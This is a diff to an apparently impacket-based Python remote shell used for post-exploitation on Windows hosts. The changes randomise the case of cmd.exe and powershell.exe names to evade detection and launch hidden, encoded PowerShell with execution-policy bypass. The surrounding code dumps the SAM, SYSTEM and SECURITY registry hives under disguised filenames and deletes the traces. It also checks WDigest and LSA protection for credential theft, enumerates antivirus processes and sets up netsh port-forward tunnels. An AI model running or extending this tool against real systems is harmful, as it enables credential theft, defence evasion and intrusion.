@@ -34,33 +34,60 @@ OUTPUT_FILENAME = random_sig()
 
 CODEC = sys.stdout.encoding
 
-def temp_perm():
+def temp_perm(option):
     """
     Function will create a permutation on the Temp directory altering it case
 
     Return: a random case on Temp
     """
-    letters = ['t', 'e', 'm', 'p']
+    letters_dir = ['t', 'e', 'm', 'p']
+    letters_cmd = ['c', 'm', 'd', '.', 'e', 'x', 'e']
+    letters_power = ['p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l', '.', 'e', 'x', 'e']
     final_arr = []
-    for i in letters:
-        rand_num = random.randint(1,2)
-        if rand_num == 1:
-            final_arr.append(i.upper())
-        else:
-            final_arr.append(i.lower())
+    if option == "dir":
+        for i in letters_dir:
+            rand_num = random.randint(1,2)
+            if rand_num == 1:
+                final_arr.append(i.upper())
+            else:
+                final_arr.append(i.lower())
+    elif option == "cmd":
+        for i in letters_cmd:
+            rand_num = random.randint(1,2)
+            if rand_num == 1:
+                final_arr.append(i.upper())
+            else:
+                final_arr.append(i.lower())
+    elif option == "power":
+        for i in letters_power:
+            rand_num = random.randint(1,2)
+            if rand_num == 1:
+                final_arr.append(i.upper())
+            else:
+                final_arr.append(i.lower())
+
+    else:
+        pass
     return ''.join(final_arr)
 
 class RemoteShell(cmd.Cmd):
     def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
         cmd.Cmd.__init__(self)
         self.__share = share
-        self.__output = '\\' + temp_perm() + '\\' + OUTPUT_FILENAME
+        self.__output = '\\' + temp_perm("dir") + '\\' + OUTPUT_FILENAME
         print(f"[*] Output Filename: {self.__output}")
         self.__outputBuffer = str('')
-        self.__shell = 'cmd.exe /Q /c '
+        self.__shell = temp_perm("cmd") + ' /Q /c '
         self.__shell_type = shell_type
-        # call function here that will generate random encoding schemes here 
-        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
+        # call function here that will generate random encoding schemes here
+        # -NOL --> No Logo
+        # -NOP --> No execution profile
+        # -STA --> Single Threaded Apartment
+        # -NONI --> Non interactive
+        # -W --> Window Style needs Hidden After
+        # -Exec --> Needs bypass after
+        # -Enc --> Encoded command
+        self.__pwsh = temp_perm("power") + ' -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
         self.__win32Process = win32Process
         self.__transferClient = smbConnection
         self.__silentCommand = silentCommand
@@ -82,8 +109,6 @@ class RemoteShell(cmd.Cmd):
 
     def format_print_buff(self):
         if len(self.__outputBuffer.strip('\r\n')) > 0:
-        #print(self.__outputBuffer.strip('\r\n'))
-        #self.__outputBuffer = ''
             print(self.__outputBuffer)
             self.__outputBuffer = ''
 
@@ -151,8 +176,8 @@ class RemoteShell(cmd.Cmd):
                     local_save_file.write(self.__outputBuffer.strip('\r\n') + '\n')
                     self.__outputBuffer = ''
                 logging.info("Survey Completed")
-            except:
-                logging.info("Something went wrong, try again")
+            except Exception as e:
+                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
         else:
             try:
                 logging.info("Starting Survey")
@@ -167,8 +192,8 @@ class RemoteShell(cmd.Cmd):
                         print(self.__outputBuffer)
                         self.__outputBuffer = ''
                 logging.info("Survey Completed")
-            except:
-                logging.info("Something went wrong, try again")
+            except Exception as e:
+                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     def do_loggrab(self, s):
         try:
@@ -181,11 +206,9 @@ class RemoteShell(cmd.Cmd):
             logging.info(s)
             self.do_lget(remote_copy.lstrip() + '\\' + s)
             self.execute_remote("del" + remote_copy + '\\' + s)
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
-        except:
-            pass
+            self.format_print_buff()
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
 
     def do_mounts(self, s):
@@ -197,8 +220,8 @@ class RemoteShell(cmd.Cmd):
                 print(new_buff)
                 self.__outputBuffer = ''
 
-        except:
-            pass
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     def do_sysinfo(self, s):
         try:
@@ -218,8 +241,8 @@ class RemoteShell(cmd.Cmd):
             self.execute_remote('ipconfig /all | findstr /i "(Preferred)"')
             self.format_print_buff()
 
-        except:
-            pass
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     def do_lcd(self, s):
         if s == '':
@@ -245,7 +268,7 @@ class RemoteShell(cmd.Cmd):
             fh.close()
 
         except Exception as e:
-            logging.error(str(e))
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
             if os.path.exists(filename):
                 os.remove(filename)
@@ -257,23 +280,23 @@ class RemoteShell(cmd.Cmd):
         try:
             self.execute_remote("netsh interface portproxy add v4tov4 listenport=%s connectport=%s connectaddress=%s" % (lport, rport, rhost))
             self.format_print_buff()
-        except error as e:
-            print("[!] Something went wrong, see below for error:\n", e)
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     def do_showtun(self, s):
         try:
             self.execute_remote("netsh interface portproxy show v4tov4")
             self.format_print_buff()
-        except error as e:
-            print("[!] Something went wrong, see below for error:\n", e)
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     def do_deltun(self, s):
         lport = s.split(" ")[0] 
         try:
             self.execute_remote("netsh interface portproxy delete v4tov4 listenport=%s" % (lport))
             self.format_print_buff()
-        except error as e:
-            print("[!] Something went wrong, see below for error:\n", e)
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
     
     def do_ls(self, s):
         #see if user specified a dir or not
@@ -281,15 +304,15 @@ class RemoteShell(cmd.Cmd):
             try:
                 self.execute_remote('dir -h .')
                 self.format_print_buff()
-            except error as e:
-                print("[!] Something went wrong, see below for error:\n", e)
+            except Exception as e:
+                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
         else:
             path = s.split(" ")[0]
             try:
                 self.execute_remote('dir -h %s' % path)
                 self.format_print_buff()
-            except error as e:
-                print("[!] Something went wrong, see below for error:\n", e)
+            except Exception as e:
+                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     
     # add progress bar, see how ivan does his
@@ -314,8 +337,8 @@ class RemoteShell(cmd.Cmd):
             self.__transferClient.putFile(drive[:-1] + '$', tail, fh.read)
             fh.close()
         except Exception as e:
-            logging.critical(str(e))
-            pass
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+
 
 
     # fix this dumpster fire     
@@ -323,8 +346,8 @@ class RemoteShell(cmd.Cmd):
         try:
             self.execute_remote('tasklist /svc | findstr /i "MsMpEng.exe || WinDefend || MSASCui.exe || navapsvc.exe || avkwctl.exe || fsav32.exe || mcshield.exe || ntrtscan.exe || avguard.exe || ashServ.exe || avengine.exe || avgemc.exe || tmntsrv.exe || kavfswp.exe || kavtray.exe || vapm.exe || avpui.exe || avp.exe"')
             self.format_print_buff()
-        except error as e:
-            print("[!] Something went wrong, see below for error:\n", e)
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
 
     # fix this output 
@@ -353,9 +376,7 @@ class RemoteShell(cmd.Cmd):
             self.__outputBuffer = ''
         else:
             logging.info("WDigest might be enabled --> LSASS clear text creds")
-            if len(self.__outputBuffer.strip('\r\n')) > 0: 
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+            self.format_print_buff()
         self.execute_remote("reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL")
         if "0x1" in self.__outputBuffer or "1" in self.__outputBuffer:
             logging.info("LSA Protection Enabled")
@@ -382,9 +403,7 @@ class RemoteShell(cmd.Cmd):
 
         else:
             logging.info("Cached Logon Credential Amount")
-            if len(self.__outputBuffer.strip('\r\n')) > 0: 
-                print(self.__outputBuffer)
-                self.__outputBuffer = '' 
+            self.format_print_buff()
 
     def do_vmcheck(self, s):
         try:
@@ -421,9 +440,8 @@ class RemoteShell(cmd.Cmd):
         try:
             self.execute_remote('type ' + s)
             self.format_print_buff()
-        except:
-            logging.critical(str(e))
-            pass
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     # an array, ever heard of one...
     def do_unattend(self, s):
@@ -502,19 +520,13 @@ class RemoteShell(cmd.Cmd):
         try:
             logging.info("SAM")
             self.execute_remote(r'reg save "HK"L""M\s""a""m"" win32.dll')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+            self.format_print_buff()
             logging.info("System")
             self.execute_remote(r'reg save "HK"L""M\s""ys""t"em" win32.exe')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+            self.format_print_buff()
             logging.info("Security")
             self.execute_remote(r'reg save "HK"L""M\s""ec""u"rit"y"" update.exe')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
+            self.format_print_buff()
             self.do_lget("win32.dll")
             os.rename("win32.dll", "SAM")
             self.do_lget("win32.exe")
@@ -524,8 +536,8 @@ class RemoteShell(cmd.Cmd):
             self.execute_remote("del win32.dll")
             self.execute_remote("del win32.exe")
             self.execute_remote("del update.exe")
-        except:
-            pass
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
 
     def do_exit(self, s):
@@ -541,8 +553,7 @@ class RemoteShell(cmd.Cmd):
     def do_cd(self, s):
         self.execute_remote('cd ' + s)
         if len(self.__outputBuffer.strip('\r\n')) > 0:
-            print(self.__outputBuffer)
-            self.__outputBuffer = ''
+            self.format_print_buff()
         else:
             if PY2:
                 self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
